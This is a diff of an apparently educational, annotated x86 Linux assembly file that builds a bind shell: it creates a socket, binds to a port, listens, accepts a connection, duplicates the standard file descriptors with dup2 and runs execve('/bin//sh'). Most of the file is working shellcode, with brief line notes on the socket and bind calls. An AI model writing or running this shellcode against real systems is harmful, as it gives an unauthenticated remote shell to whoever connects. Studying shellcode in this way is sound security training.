@@ -11,53 +11,9 @@ inc bl
 mov al,102
 int 0x80
 mov esi,eax
-
-push edxx
-push long 0xAAAA02AA
-mov ecx,esp
-push byte 0x10
-push ecx
-push esi
-mov ecx,esp
-inc bl
-mov al,102
-int 0x80
-
-push edx
-push esi
-mov ecx,esp
-mov bl,0x4
-mov al,102
-int 0x80
-
-push edx
-push edx
-push esi
-mov ecx,esp
-inc bl
-mov al,102
-int 0x80
-mov ebx,eax
-
-xor ecx,ecx
-mov cl,3
-loop:
-dec cl
-mov al,63
-int 0x80
-jnz loop
-
-push edx
-push long 0x68732f2f
-push long 0x6e69622f
-mov ebx,esp
-push edx
-push ebx
-mov ecx,esp
-mov al,0x0b
-int 0x80
-
+---------------------------
 Line 6 - 14 : socket(2,1,0) -> socket(AF_INET,SOCK_STREAM,0)
+
 Line 6 - 8 
   pushing arguments for socket() in stack
 Line 9 - 11
@@ -67,8 +23,56 @@ Line 12
   systemcall
 Line 13
   return value of systemcall(file descriptor) is stored in esi
-  
-Line 15 - 24 : bind(
+---------------------------
+push edx
+push long 0xAAAA02AA
+mov ecx,esp
+push byte 0x10
+push ecx
+push esi
+mov ecx,esp
+inc bl
+mov al,102
+int 0x80
+---------------------------
+Line 27 - 36 : bind(soc, (struct sockaddr *)&serv_adr, 0x10)
+---------------------------
+push edx
+push esi
+mov ecx,esp
+mov bl,0x4
+mov al,102
+int 0x80
+---------------------------
 
+---------------------------
+push edx
+push edx
+push esi
+mov ecx,esp
+inc bl
+mov al,102
+int 0x80
+mov ebx,eax
+---------------------------
 
+---------------------------
+xor ecx,ecx
+mov cl,3
+loop:
+dec cl
+mov al,63
+int 0x80
+jnz loop
+---------------------------
 
+---------------------------
+push edx
+push long 0x68732f2f
+push long 0x6e69622f
+mov ebx,esp
+push edx
+push ebx
+mov ecx,esp
+mov al,0x0b
+int 0x80
